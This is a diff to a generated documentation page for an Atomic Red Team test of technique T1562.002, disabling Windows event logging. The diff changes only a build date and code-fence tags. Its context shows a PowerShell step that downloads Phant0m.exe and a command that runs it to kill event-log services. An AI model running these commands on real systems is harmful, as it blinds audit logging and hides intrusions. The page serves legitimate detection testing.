@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1562.002"
 attack_technique_name: "Impair Defenses: Disable Windows Event Logging"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.002/T1562.002.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "3ddf3d03-f5d6-462a-ad76-2c5ff7b6d741"
@@ -51,13 +51,13 @@ Phant0m.exe must exist on disk at specified location (#{file_name})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{file_name}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory (split-path "#{file_name}") -ErrorAction ignore | Out-Null
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1562.002/bin/Phant0m.exe" -OutFile "#{file_name}" -UseBasicParsing
 ```
@@ -68,13 +68,13 @@ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/ato
 
 ### Command
 
-```commandprompt
+```cmd
 "#{file_name}"
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 echo "Sorry you have to reboot"
 ```
 
